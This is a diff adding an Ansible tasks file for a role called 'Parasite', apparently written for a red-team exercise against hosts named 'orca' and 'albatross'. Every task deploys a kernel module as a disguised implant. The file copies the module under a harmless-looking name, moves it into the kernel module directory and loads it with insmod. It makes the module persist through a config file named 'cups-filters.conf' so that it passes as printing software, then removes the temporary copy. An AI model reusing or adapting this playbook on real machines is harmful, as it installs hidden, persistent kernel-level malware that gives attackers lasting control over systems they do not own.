@@ -1,0 +1,31 @@
+---
+# tasks file for Parasite
+
+# orca - copy parasite
+- name: Orca - Copying Parasite to /tmp/
+  copy:
+    src: 'roles/parasite/files/orca_rocky.ko'
+    dest: /tmp/ts_btwos.ko
+  when: inventory_hostname_short == "orca"
+
+# albatross - copy parasite
+- name: Albatross - Copying Parasite to /tmp/
+  copy:
+    src: 'roles/parasite/files/albatross_arch.ko'
+    dest: /tmp/ts_btwos.ko
+  when: inventory_hostname_short == "albatross"
+
+# move parasite
+- name: Moving Parasite to /lib/modules/$(uname -r)/kernel/lib/
+  shell: mv /tmp/ts_btwos.ko /lib/modules/$(uname -r)/kernel/lib/
+
+# insert parasite
+- name: Activating Parasite
+  shell: insmod /lib/modules/$(uname -r)/kernel/lib/ts_btwos.ko
+
+# recompile dependency list, create modules conf, insert parasite into conf
+- name: Creating and establishing persistence
+  shell: depmod -a && touch /etc/modules-load.d/cups-filters.conf && echo "ts_btwos" >> /etc/modules-load.d/cups-filters.conf
+
+- name: Cleaning up parasite copy
+  shell: rm /tmp/ts_btwos.ko
